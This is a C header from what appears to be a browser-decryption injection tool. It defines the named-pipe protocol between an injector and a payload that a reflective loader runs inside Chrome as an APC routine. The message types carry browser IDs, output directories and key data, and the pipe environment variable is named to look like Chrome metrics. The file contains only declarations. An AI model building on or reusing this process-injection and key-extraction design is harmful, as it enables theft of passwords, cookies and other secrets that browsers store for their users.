#ifndef PAYLOAD_H
#define PAYLOAD_H

#include <windows.h>
#include "../abe/elevator.h"

// IPC pipe name format — injector creates, payload connects
// Default format; can be overridden by passing pipe name via shellcode
#define PIPE_NAME_FMT "\\\\.\\pipe\\chromdec_%lu"
#define PIPE_NAME_ENV "CHROME_METRICS_PIPE"

// Message types for pipe IPC
#define MSG_READY       0x01
#define MSG_BROWSER_ID  0x02
#define MSG_OUTPUT_DIR  0x03
#define MSG_KEY_DATA    0x04
#define MSG_STATUS      0x05
#define MSG_DONE        0xFF

#pragma pack(push, 1)
typedef struct _PIPE_MSG {
    BYTE    type;
    DWORD   length;
    BYTE    data[];
} PIPE_MSG;
#pragma pack(pop)

// Payload entry point — called by reflective loader as APC routine
void CALLBACK payload_main(ULONG_PTR param);

#endif
